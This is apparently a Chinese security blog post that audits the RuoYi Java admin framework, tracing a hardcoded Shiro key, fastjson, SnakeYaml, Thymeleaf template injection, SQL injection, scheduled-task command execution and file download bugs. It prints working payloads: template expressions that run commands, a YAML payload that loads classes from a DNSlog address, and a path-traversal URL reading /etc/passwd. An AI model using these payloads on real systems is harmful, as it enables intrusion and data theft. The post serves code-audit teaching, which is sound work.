环境搭建:
=====

使用idea进行环境搭建。

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680661027185-28c65f5a-bdf4-4b60-a631-d6c6b334cf03.png)

导入数据库之后。

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680661043418-2c302959-37bf-4720-b263-cf528b6a5b97.png)

启动环境。  
![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1681138803596-38dba76b-3092-459a-a9e6-a3e7d60f0451.png)

代码审计:
=====

第三方组件漏洞审计
---------

本项目使用Maven构建的。因此我们直接看pom.xml文件引入了哪些组件。通过IDEA打开该若依，发现本项目采用了多模块方式。根据这些组件漏洞的版本，然后去判断是否存在该漏洞。

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1681379882526-30ed5912-aec0-4009-9246-3b7017408c77.png)

组件漏洞代码审计
--------

### Shiro反序列化漏洞(v4.2)

定位到Shiro配置文件位于  
RuoYi-v4.2\\ruoyi-

framework\\src\\main\\java\\com\\ruoyi\\framework\\config\\ShiroConfig.java

进入Shiro配置文件，发现对资源访问的拦截器配置，位于 第231行 ~ 276行 。发现 第272行 使用了 /\*\* 表达式，对路径进行拦截。

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1681137594796-7ad9fa55-b581-4c31-96e9-ce76e4163772.png)关于shiro的拦截匹配模式。  
**补充：**  
Shiro中的URL路径表达式由三部分组成：

1. 资源定位符（Resource Locator）：指要保护的特定资源或资源组件，比如 /admin/\*\*
2. 访问控制指令（Action/Permission）：指允许或拒绝特定资源的一组操作或权限，比如 create, read, update, delete
3. 过滤器链（Filter Chain）：指应该执行的安全过滤器链，每个过滤器都有自己的行为和责任。

在Shiro中，可以使用Ant风格的路径表达式来匹配URL地址。Ant风格的路径表达式可以使用通配符 \* 表示0个或多个字符，使用 ? 表示1个字符。

以下是一些示例：

- /admin/\*\* = 匹配所有以 /admin/ 开头的URL
- /user/create = 匹配具体的URL路径 /user/create
- /login.jsp = 匹配具体的URL路径 /login.jsp

#### 漏洞复现：

进入Shiro配置文件时，发现了Shiro密钥硬编码写在了代码中。在 RuoYi-v4.2\\ruoyi-framework\\src\\main\\java\\com\\ruoyi\\framework\\config\\ShiroConfig.java中。![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680788659019-4725ef40-beaa-49bb-b982-ef9fd4129c95.png)

通过搜索关键字 setCipherKey ，来看看密钥是否硬编码在了代码中。攻击者在知道了密钥后，就可以构造恶意payload，经过序列化、AES加密、base64编码操作加工后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞，进而在目标机器上执行任意命令。

使用burp进行测试，发现cookie含有rememberme的字段。  
![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1681137772766-85ac714b-17df-4c6b-8375-f31b08bdac7c.png)  
接着使用脚本进行验证漏洞。  
![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680791402311-f8001671-c205-465e-a931-cf8eff02fa4f.png)  
也可以使用一自动化工具进行漏洞利用。  
![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1681137956139-d89ffe08-37a7-4b86-b6f1-3f9910b25d3d.png)  
成功获取权限。  
![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1681137968611-a0442547-7c1f-46ad-9286-f97f21039af0.png)

### fastjson反序列化漏洞

全局搜索关键字parseObject。

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680662069276-b38e5a33-74a5-4157-9515-f81ee91cdb88.png)  
下面我们追踪下流程，看看是否有接收用户输入的地方。  
先进入 VelocityUtils.java。![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680663347090-4bda80a8-76b8-486e-b0e7-5333df9ddfa5.png)  
从代码中看到 JSONObject.parseObject(options); 需要一个参数为  
options ，该参数来自 genTable.getOptions(); 跟进这个函数， 发现getOptions() 返回值为 options 。![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680663816105-9c0ab542-b325-48d7-9517-b0876ecb13cb.png)

继续跟进 options  
![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680703965789-12875aad-1aef-413a-a76d-6afc5bf9c4ae.png)  
跟进 setTreeVelocityContext ，发现是prepareContext 中调用了它。

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680704070858-02ea80dc-ed42-4f54-a2af-e080baa54f8f.png)![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680704092426-9b3aaaec-7552-4d5b-9c9d-0180513fca39.png)

跟进GenConstants.TPL\_TREE ，看到定义了一个常量字符为 tree 。

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680704144452-8dc222a1-994c-4a03-8626-347446773685.png)

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680704304756-fe26cd54-335e-46f0-99dc-92794bef577f.png)

跟进下 tplCategory ，该值来自于 genTable.getTplCategory();

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680705175492-3e766ae8-0086-44bd-bc97-b1b0b7c984c1.png)

进入 genTable.getTplCategory(); 看到 getTplCategory() 返回值就是

tplCategory 。

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680705239331-f9a86212-713a-45e0-b204-9bffafa7ab90.png)  
继续跟进 tplCategory ，该字段应该有两个值，一个是 crud ，一个是 tree 。所以我们再找到功能点时，应该将这个字段值设为 tree 。

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680705322117-b03ae872-cb09-4e51-9aee-8525304c79f6.png)

我们继续追踪功能点。回到 prepareContext() 方法，我们看下谁调用了他，发现GenTaleServiceImpl.java 中第187行和250行都有所调用。

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680705518503-b8244446-6924-4cda-a35f-b8e8fc99374c.png)

进入 GenTaleServiceImpl.java这个java文件中 ，发现是 previewCode 方法使用了 VelocityUtils.prepareContext(table); ，其中 table参数 来自

genTableMapper.selectGenTableById(tableId); 根据 tableId 查询表信息返回的数据。

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680705709859-dd2895f5-41a1-42e8-a5e0-fbbe597b6d35.png)

我们只能操控 tableId 参数。继续跟踪一下 previewCode 。

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680708164708-ade9e68b-d5a6-44ec-b4c0-1369776b3cd7.png)

继续跟进previewCode，跳转到了 GenController 层，发现是 preview 使用了

genTableService.previewCode(tableId);

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680708207384-c60d08e1-f4c3-4703-9739-b99dfdbf5caa.png)  
在路径tool/gen/preview中 获取 tableId 。

我们继续往下找发现 GenTaleServiceImpl.java 第286行这个参数是我们可以操控的。追踪流程如下。![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680786669378-d1ff0378-7d22-4526-8368-0cfdf64cddac.png)

跟进 genTable.getParams() ，跳转到了 BASEEntity.java 代码中。

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680786759984-1886da4f-bfa0-4450-b80d-3e3ef1b7b1a6.png)  
回到 GenTaleServiceImpl.java ，查看谁调用了 validateEdit ，跳转到了IGenTaleService。

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680786854429-84e8ad59-54ef-419e-a940-39f43460a5fe.png)![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680786862065-ee62bcf3-75a8-4509-847a-6f3c0fa966ab.png)

继续跟进 validateEdit ，跳转到了 GenController 层第142行。  
![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680786904696-cb926a16-452a-469c-a92f-aa2fb4ef7738.png)

### SnakeYaml组件漏洞

**漏洞简介：**

SnakeYaml是一款基于Java的YAML解析器。SnakeYAML存在缓冲区错误漏洞，该漏洞源于解析不受信任的YAML文件可能容易受到拒绝服务攻击 (DOS)。如果解析器在用户提供的输入上运行，攻击者通过特制内容导致解析器因堆栈溢出而崩溃。有报道指出官方认为SnakeYaml的使用场景仅接收可信的数据源，因此不认为cve-2022-1471是漏洞，因此目前还没有修复，后续可能也不会修复。但是，为了防范潜在的风险，建议开发人员排查SnakeYaml的使用情况，判断是否接收外部数据，并加入new SafeConstructor()类进行过滤。  
经过全局搜索Yaml.load（,发现本项目并没有使用到这个组件。

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680786983791-f0c906a7-a4e3-4cdf-9beb-a1a31813768b.png)

### Thymeleaf组件漏洞

在第三方组件漏洞审计时，了解到Thymeleaf组件版本为 2.0.0 ，该版本存在SSTI（模板注入）漏洞。tutorial/content/docs/introduction.html  
Thymeleaf是一款流行的Java模板引擎，用于生成HTML、XML、JavaScript、CSS和文本文件。根据\[[1](https://paper.seebug.org/1332/)\]的披露，Thymeleaf存在一种路径遍历漏洞，攻击者可以在参数中注入恶意输入来访问Web服务器上的任意文件。例如，以下代码在请求参数中包含了一个../../file.txt的路径跳转字符串来读取敏感文件：

```php
@GetMapping("/view")
@ResponseBody
public String view(@RequestParam(value="name", required=false, defaultValue="../../file.txt") String name) throws IOException {
    File file = new File(name);
    FileReader fr = new FileReader(file);
    BufferedReader br = new BufferedReader(fr);
    String line;
    StringBuilder sb = new StringBuilder();
    while ((line = br.readLine()) != null) {
        sb.append(line);
    }
    br.close();
    fr.close();
    return sb.toString();
}

```

建议开发人员使用Thymeleaf的内置安全性功能来防止路径遍历攻击，并确保不将用户输入直接传递给模板或模板构造器。例如，可以使用Spring Security提供的表达式语言SpEL对请求参数进行安全处理，比如加入${#httpServletRequest.parameter('name')}，将其设置在Thymeleaf中的每个变量前。另外，要注意限制允许访问的文件夹以及最小化在“src/main/resources”等敏感目录下存储的文件。更多关于Thymeleaf路径遍历漏洞及修复方法的信息，Thymeleaf模板注入形成原因，简单来说，在Thymeleaf模板文件中使用th:fragment、 ， th:text 这类标签属性包含的内容会被渲染处理。并且在Thymeleaf渲染过程中使用 ${...} 或其他表达式中时内容会被Thymeleaf EL引擎执行。因此我们将攻击语句插入到 ${...} 表达式中，会触发Thymeleaf模板注入漏洞。如果带有 @ResponseBody 注解和 @RestController 注解则不能触发模板注入漏洞。因为 @ResponseBody 和 @RestController 不会进行View解析而是直接返回。

**SSTI（模板注入）漏洞点:**

我们在审计模板注入（SSTI）漏洞时，主要查看所使用的模板引擎是否有接受用户输入的地方。主要关注xxxController层代码。

在Controller层，我们关注两点： 1、URL路径可控。 ， 2、return内容可控。对应上面两个关注点，举例说明如下。

**1、URL路径可控**

@RequestMapping("/hello")  
public class HelloController {  
@RequestMapping("/whoami/{name}/{sex}")  
public String hello(@PathVariable("name") String name,  
@PathVariable("sex") String sex){  
return "Hello" + name + sex;  
}  
}

**2、return内容可控**

@PostMapping("/getNames")  
public String getCacheNames(String fragment, ModelMap mmap)  
{  
mmap.put("cacheNames", cacheService.getCacheNames());  
return prefix + "/cache::" + fragment;  
}

根据上面两个关注点，发现v4.2 并没有发现存在Thymeleaf模板注入漏洞点。

但在 若依v4.7.1 发现存在 return内容可控 的情况。

在 若依v4.7.1 的 RuoYi-v4.7.1\\ruoyi-  
admin\\src\\main\\java\\com\\ruoyi\\web\\controller\\monitor 下多了一个CacheController.java 文件。该文件下有多个地方 Return内容可控 。  
![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680787241203-6f2ef9e8-a226-48a4-bb02-f9d24032b16d.png)  
接收到 fragment 后，在return处进行了模板路径拼接。根据代码我们知道根路径为 /monitor/cache ，各个接口路径分别为 /getNames ， /getKeys ， /getValue 。请求方法为 POST ，请求参数均为fragment 。

### 漏洞复现：

构造一下payload，org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager  
\[!!java.net.URLClassLoader \[\[!!java.net.URL \["ftp://此处填入DNSlog地  
址"\]\]\]\]')

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680792503748-19a18f7e-21d6-44ec-956c-08e1b3338410.png)

发现若依v4.7.1 存在Thymeleaf模板注入漏洞，并且存在return内容可控的漏洞点，我们通过渗透测试角度进行漏洞验证。Thymeleaf模板注入payload举例：发现return内容可控：  
\_\_${new  
java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("whoami").getI  
nputStream()).next()}\_\_::.x  
URL路径可控：  
\_\_${T(java.lang.Runtime).getRuntime().exec("touch test")}\_\_::.x

本次漏洞验证我在Windows环境下进行的。

⚠ 注意： 若依v4.7.1 搭建部署与 若依v4.2 相同，数据库导入务必使用 sql 目录

下的 ry\_20210924.sql 和 quartz.sql 。先导入 ry\_20210924.sql 。

return内容可控：

\_\_${new

java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("whoami").getI

nputStream()).next()}\_\_::.x

URL路径可控：

\_\_${T(java.lang.Runtime).getRuntime().exec("touch test")}\_\_::.x

我们以 getKeys 接口为例，该漏洞点为 return内容可控 ，具体漏洞验证如下。进入系统监控下，使用缓存监控，和代码审计发现的 CacheControlle 代码文件中功能注释一样。访问缓存监控功能。分别点击 缓存列表和键名列表旁的刷新按钮，会分别想 getNames ， getKeys 接口发送数据。  
![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680792833249-4587c223-0803-4170-92cb-a3fd22a42dd3.png)

将数据包发送到Repeater模块，在 fragment 参数后构造攻击payload为 \_\_${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("calc.exe")}\_\_::.x ，对paylod进行URL编码后。  
发送数据包。响应报错，而且并没有弹出来计算器。如下图所示：

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680792855389-1c0146d7-bdad-47e9-b7e5-e6402bfb1aae.png)  
我们将Payload改造一下，如 ${T(java.lang.Runtime).getRuntime().exec("calc.exe")} 。在T和(之间多加几个空格即可。对Payload进行URL编码后，放入 fragment 参数中，弹出了计算器

在编码和不编码的情况下，发现都可以弹出计算机。  
![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1681053101527-0ec74454-40b4-4deb-9feb-b623273fb96c.png)  
![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1681051773615-4ba6cd08-47b3-48db-8bc5-6371b7d5d6b3.png)  
![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1681051758971-5847e3b4-dc17-48c4-9710-ad35b77eef01.png)

web漏洞
-----

### SQL注入漏洞

全局搜索关键字 $ ，并限定文件类型为 .xml ，发现 sysDeptMapper.xml 和 sysUserMapper.xml 有存在SQL注入的地方。

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680787547426-ba71f550-29a9-42c8-9e4b-75d8ccb2c6a7.png)  
然后看SysRoleMapper.xml 这个xml文件![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680787623339-19a9fd0a-64ec-489c-9ccd-e0f0559f60be.png)

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680787638170-ad47c12d-3195-4658-bf31-7ddbf7425b69.png)  
点击左侧箭头快速跳转到DAO层,（IDEA中需要安装Free Mybatis plugin插件)

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680787936231-68bb61b7-c724-4608-bd93-755db3e27f97.png)  
按住Ctrl加鼠标左键，点击 selectRoleList ，查看谁调用了它。最终来到  
SysRoleServiceImpl 的实现层.

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680787989480-4676d1ba-70e9-44f1-8e1f-900cfc21fe32.png)  
进入 SysRoleServiceImpl 后，再回溯到 SysRoleService 层，或者选中 selectRoleList 后使用快捷键或箭头。

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680788046710-ee6abe2c-444e-4b32-a04c-dadfc2a72502.png)

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680788074923-fbac616a-4a6e-4fd0-aaf7-aee3d8730e02.png)  
回溯到 Controller 层，最终发现是 SysRoleController 调用了这个方法。

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680788116898-9c86eb1c-995a-4f4f-adab-825c5d128e4e.png)

点击进入，最终定位到src\\main\\java\\com\\ruoyi\\web\\controller\\system\\SysRoleController.java ，第58行和第68行都有调用。

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680788182808-c2991bd2-7633-4c08-a011-031b532ab4ee.png)

点击 SysRole ，进入看看定义了哪些实体类，其中发现了 DataScope 。

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680788228758-94fcf896-4014-461a-8b23-00d40ed11e4d.png)

回顾下整理流程，如下所示：

sysRoleMapper.xml -&gt; SysRoleMapper.java -&gt; SysRoleServiceImpl.java -

\\&gt; ISysRoleService.java -&gt; SysRoleController.java

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680788243996-93bd7e01-cf60-4253-ab65-7804dd76d9f1.png)

#### 漏洞复现：

访问 角色管理 功能，通过点击下面的各个按钮，并配合BurpSuite抓包，发现 搜索 功能，会向 /system/role/list 接口发送数据，如下图所示：

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680790856901-07c6f98d-5f6c-4e44-a6b6-e80e7b045604.png)

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680790811143-6e9b23ea-fb13-4753-8854-4911603fdce5.png)

使用sqlmap进行漏洞验证。

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680790881934-f94bb14d-8ee6-4370-96d3-22f0e63e3cbd.png)

### 定时任务功能处命令执行漏洞

我们了解到本项目中有使用到定时任务功能，了解到本项目定时任务功能在 ruoyi-quartz 模块下，使用的是 quartz 框架。

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680788716385-d87407ad-8d16-43db-a03f-8367ac9e0d1d.png)

进入 ruoyi-quartz 模块 src\\main\\java\\com\\ruoyi\\quartz 下，我们先关注controller 文件代码。我们知道 Controller 也是控制层，再向 Service层 传输。打开 controller 文件下，有两个代码文件，分别是 SysJobController 和SysJobLogController。

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680788773377-eb65dc82-eca3-472e-8073-447093a07453.png)

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680788803999-ff1c5104-7204-4d9f-9940-0b7491466a64.png)

对 SysJobController下的run方法 进行追踪，根据注释该方法为任务调度立即执行一次。  
![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680789042684-f9bdfc64-b3a1-4ed2-a3fb-eb5a59fa03d3.png)  
使用鼠标选中jobService.run(job) ，进入Service层后，无其他执行代码，继  
续跟踪到实现层，最终代码位于 RuoYi-v4.2\\ruoyi-  
quartz\\src\\main\\java\\com\\ruoyi\\quartz\\service\\impl\\SysJobServiceImpl.java 第180行到188行。  
![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680789100438-718d29a6-e0ff-45eb-b472-b123972ad3df.png)  
进入 JobInvokeUtil.invokeMethod(sysJob); ，最终方法实现如下图所示：

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680789160815-68f6fc7f-7ba6-48cf-a5f5-ce1418f6e376.png)

第25行到28行，为获取处理数据，可以在这里使用断点来进行分析。

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680789198696-ba61d9fb-fd01-47b9-b5d4-b43fa17a91ea.png)  
它支持两种方式调用，分别为支持 Bean 调用和  
Class 类调用。此处判断我理解为通过 beanname 判断是否为有效的classname。使用 bean 方式调用，还是使用 Class 方式调用。此处，可以创建两种方式的目标字符串后，在 if(!isValidClassName(beanName)) 处打个断点，分别执行跟踪一下。![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680789294466-203ab44f-d4c7-42bf-8fac-1bf9ba074517.png)

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1680789323966-3fd76294-47fb-4b41-ab10-32944eb6a9ac.png)

#### 漏洞复现：

首先进行添加任务  
![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1681138803596-38dba76b-3092-459a-a9e6-a3e7d60f0451.png)  
然后输入pyaload。  
![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1681138846987-0c8517e7-73fd-44f0-abf7-2b0f042d74d4.png)  
然后执行这个定时任务，发现dnslog回显。  
![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1681138829323-9d6b97e9-83f6-42b4-8b67-7b7e7205bf9a.png)  
也可以使用若依工具验证:

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1681139160387-8b1bb860-2749-4377-96bb-0b239c8e436b.png)

### 任意文件读取/下载漏洞

在本项目中，发现存在一处下载功能。  
代码位于 RuoYi-v4.2\\ruoyi-  
admin\\src\\main\\java\\com\\ruoyi\\web\\controller\\common\\CommonController  
.java 第96行-第111行。通过注释一目了然该部分代码的作用。  
![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1681138328535-5c8030ef-be7c-4041-808b-7731ffce692a.png)

全局搜索关键字 resourceDownload ，发现并没有其他功能调用它。我们可以自己去构造方法然后去下载。  
![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1681479561621-cef5f525-7824-4c7d-a67b-61284711a749.png)  
1、首先，漏洞代码点位于第118行，使用了 FileUtils.writeBytes() 方法输出指定文件的byte数组，即将文件从服务器下载到本地。

2、 downloadPath 来自第103行，是由 localPath 和StringUtils.substringAfter(resource, Constants.RESOURCE\_PREFIX); 组成。

3、 localPath 来自第101行注释为 本地资源路径 ，通过打个端点，我们可以看到localPath: D:/ruoyi/uploadPath ，是从  
src\\main\\resources\\application.yml 配置文件中第12行文件路径中获取的。  
![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1681138368081-67184f26-2851-4e8e-9672-2880eb992bbb.png)

4、通过第96行，知道接口路径为 /common/download/resource ，仅接受GET请求。

5、通过第97行， String resource 知道接收参数值的为 resource 。

#### 漏洞复现：

漏洞Payload: <http://127.0.0.1/common/download/resource?>

resource=/profile/../../../../etc/passwd 。

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1681479639295-39f0b535-347c-4032-97e7-c10383442cfe.png)

![](https://cdn.nlark.com/yuque/0/2023/png/1353500/1681479615206-2d3cc02a-c7c4-462a-8725-c50cd0b8f2b4.png)

**REF：**  
[https://blog.csdn.net/qq\_44029310/article/details/125296406](https://blog.csdn.net/qq_44029310/article/details/125296406)

<https://blog.csdn.net/Power7089/article/details/126625160>

<https://xz.aliyun.com/t/11928>